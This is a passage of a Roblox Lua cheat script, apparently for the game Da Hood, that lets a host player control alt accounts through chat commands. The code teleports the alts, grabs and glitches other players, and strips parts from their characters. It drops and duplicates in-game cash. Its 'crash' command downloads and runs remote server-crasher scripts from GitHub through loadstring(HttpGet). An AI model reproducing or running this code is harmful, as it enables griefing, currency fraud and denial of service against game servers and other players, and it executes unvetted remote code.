                                            game.ReplicatedStorage.MainEvent:FireServer("Grabbing",false)
                                        end
                                    end)
                                    wait(.5)
                                until Target.Character:FindFirstChild("GRABBING_CONSTRAINT")
                                if theplace == "Admin" then
                                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(string.split(TPAREAS['Admin'],",")[1],string.split(TPAREAS['Admin'],",")[2],string.split(TPAREAS['Admin'],",")[3])
                                elseif theplace == "Train" then
                                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(string.split(TPAREAS['Train'],",")[1],string.split(TPAREAS['Train'],",")[2],string.split(TPAREAS['Train'],",")[3])
                                elseif theplace == "Club" then
                                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(string.split(TPAREAS['Club'],",")[1],string.split(TPAREAS['Club'],",")[2],string.split(TPAREAS['Club'],",")[3])
                                elseif theplace == "Bank" then
                                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(string.split(TPAREAS['Bank'],",")[1],string.split(TPAREAS['Bank'],",")[2],string.split(TPAREAS['Bank'],",")[3])
                                elseif theplace == "HOST" then
                                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = op.Character.HumanoidRootPart.CFrame+op.Character.HumanoidRootPart.CFrame.lookVector*3.5
                                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame*CFrame.Angles(0, math.rad(180), 0)
                                end
                                wait(3)
                                repeat
                                    if not Target.Character:FindFirstChild("GRABBING_CONSTRAINT") then
                                        wait(1)
                                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldpos
                                        return
                                    end
                                    pcall(function()
                                        game.ReplicatedStorage.MainEvent:FireServer("Grabbing",false)
                                    end)
                                    wait(0.01) 
                                until not Target.Character:FindFirstChild("GRABBING_CONSTRAINT")
                                wait(1)
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldpos
                            end
                        end
                    end
                end
            elseif msg[1] == Settings['Prefix'].."surround" then
                Surronund(msg[2])
            elseif msg[1] == Settings['Prefix'].."present" then
                if string.lower(msg[2]) == "heart" then
                    PresentSetupLOL("HeartSetup",op.Name)
                elseif string.lower(msg[2]) == "diamond" then
                    PresentSetupLOL("DiamondSetup",op.Name)
                elseif string.lower(msg[2]) == "line" then
                    PresentSetupLOL("HorizontalLine",op.Name)
                elseif string.lower(msg[2]) == "alts" then
                    local whitelisted = {}
                    table.insert(whitelisted,player.Name)
                    table.insert(whitelisted,op.Name)
                    for i,v in pairs(game.Players:GetChildren()) do
                        if not table.find(Alts,v.UserId) then
                            table.insert(whitelisted,v.Name)
                        end
                    end
                    for i,v in pairs(game.Players:GetChildren()) do
                        if not table.find(whitelisted,v.Name) then
                            for i2,v2 in pairs(v.Character:GetChildren()) do
                                if v2:IsA("MeshPart") or v.Name == "HumanoidRootPart" or v.Name == "Humanoid" then
                                    v2:Destroy()
                                end
                            end
                            game:GetService("RunService").Stepped:Connect(function()
                                v.Character.HumanoidRootPart.CFrame = CFrame.new(-967,21,-632)
                            end)
                        end
                    end
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = op.Character.HumanoidRootPart.CFrame+op.Character.HumanoidRootPart.CFrame.lookVector*5
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame*CFrame.Angles(0, math.rad(180), 0)
                end
            elseif msg[1] == Settings['Prefix'].."glitch" then
                if Alts[1] == player.UserId then
                    player.Character.HumanoidRootPart.Anchored = false
                    Toggles['KNOCKING'] = true
                    local KO_Data = KnockPlr(msg[2])
                    if KO_Data then
                        pcall(function()
                            Toggles['KNOCKING'] = false
                            local Target = game.Players[KO_Data]
                            if Target.Character and game.Players.LocalPlayer.Character and Target.Character.BodyEffects:FindFirstChild("Dead").Value == false and Target.Character.BodyEffects:FindFirstChild("K.O").Value == true then
                                local oldpos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                                repeat
                                    pcall(function()
                                        if not Target.Character:FindFirstChild("GRABBING_CONSTRAINT") then
                                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Target.Character.UpperTorso.Position.X,Target.Character.UpperTorso.Position.Y+1.3,Target.Character.UpperTorso.Position.Z)
                                            game.ReplicatedStorage.MainEvent:FireServer("Grabbing",false)
                                        end
                                    end)
                                    wait(.5)
                                until Target.Character:FindFirstChild("GRABBING_CONSTRAINT")
                                wait(.5)
                                local Animation = Instance.new("Animation",game.Players.LocalPlayer.Character)
                                Animation.AnimationId = "rbxassetid://3152378852"
                                game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Animation):Play()
                                wait(1)
                                game.Players.LocalPlayer.Character.Humanoid.Health = 0
                                game.Players.LocalPlayer.Character:Wait()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldpos
                            end
                        end)
                    elseif KO_Data == false then
                        Toggles['KNOCKING'] = false
                    end
                end
            elseif msg[1] == Settings['Prefix'].."cdrop" then
                local data = calculator(msg[2],SignGetter(msg[2]))
                if data then
                    Toggles['CustomDropping'] = false
                    Toggles['CustomDropping'] = true
                    Toggles['Blocking'] = true
                    CustomDropCash(msg[2],tonumber(data))
                    Toggles['Blocking'] = false
                    wait(0.5)
                    for i=1,10 do
                        wait()
                        game.ReplicatedStorage.MainEvent:FireServer("Block",false)
                    end
                end
            elseif msg[1] == Settings['Prefix'].."crash" then
                if player.UserId == Alts[1] then
                    setfpscap(60)
                    if game.CoreGui:FindFirstChild("YOMOMMAFAT") then
                        game.CoreGui:FindFirstChild("YOMOMMAFAT"):Destroy()
                    end
                    if string.lower(msg[2]) == "swag" then
                        loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
                    elseif string.lower(msg[2]) == "encrypt" then
                        loadstring(game:HttpGet("https://raw.githubusercontent.com/LPrandom/lua-projects/master/dahoodcrasher.lua"))()
                    end
                elseif player.UserId == Alts[2] then
                    setfpscap(60)
                    if game.CoreGui:FindFirstChild("YOMOMMAFAT") then
                        game.CoreGui:FindFirstChild("YOMOMMAFAT"):Destroy()
                    end
                    if string.lower(msg[2]) == "swag" then
                        loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
                    elseif string.lower(msg[2]) == "encrypt" then
                        loadstring(game:HttpGet("https://raw.githubusercontent.com/LPrandom/lua-projects/master/dahoodcrasher.lua"))()
                    end
                elseif player.UserId == Alts[3] then
                    setfpscap(60)
                    if game.CoreGui:FindFirstChild("YOMOMMAFAT") then
                        game.CoreGui:FindFirstChild("YOMOMMAFAT"):Destroy()
                    end
                    if string.lower(msg[2]) == "swag" then
                        loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
                    elseif string.lower(msg[2]) == "encrypt" then
                        loadstring(game:HttpGet("https://raw.githubusercontent.com/LPrandom/lua-projects/master/dahoodcrasher.lua"))()
                    end
                end
            elseif msg[1] == Settings['Prefix'].."dupe" then
                local DATANAME = CheckPlr2(msg[2])
                if DATANAME then
                    if DATANAME ~= player.Name then
                        local newalts = FormatAlts()
                        local cords = PresentSetups['SurroundSetup']
                        local index = 0
                        local Target = game.Players[DATANAME]
                        for i,v in pairs(newalts) do
                            if v == player.UserId then
                                index = index + 1
                                local x,y,z = string.split(cords[index],",")[1],string.split(cords[index],",")[2],string.split(cords[index],",")[3]
                                player.Character.HumanoidRootPart.CFrame = CFrame.new(Target.Character.HumanoidRootPart.CFrame.X+tonumber(x),Target.Character.HumanoidRootPart.CFrame.Y+tonumber(y),Target.Character.HumanoidRootPart.CFrame.Z+tonumber(z))
                            else
                                index = index + 1
                            end
                        end
                        wait(2)
                        Toggles['Dropping'] = true
                        Toggles['Blocking'] = true
                    else
                        Toggles['Cashauraing'] = true
                    end
                end
            elseif msg[1] == Settings['Prefix'].."say" then
                local final_msg = ""
                local new_msg = {}
                for i,v in pairs(msg) do
                    table.insert(new_msg,v)
                end
                                
                table.remove(new_msg,1)
                local index = 0
                for i,v in pairs(new_msg) do
                    index = index + 1
                    if index == 1 then
                        final_msg = final_msg..""..v
                    else
                        final_msg = final_msg.." "..v
                    end
                end
                saymsg(final_msg)
            elseif msg[1] == Settings['Prefix'].."fps" then
                if tonumber(msg[2]) then
                    setfpscap(msg[2])
                    saymsg(player.Name.." new fps "..msg[2])
                end
            end
        end
    end
end

game.ReplicatedStorage.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(messageData) 
    local user = game:service"Players":GetPlayerByUserId(game.Players:GetUserIdFromNameAsync(messageData.FromSpeaker))
    local msg = messageData.Message
    if user.UserId == Settings['Host'] then
        cmds(msg, user.UserId)
    end
end)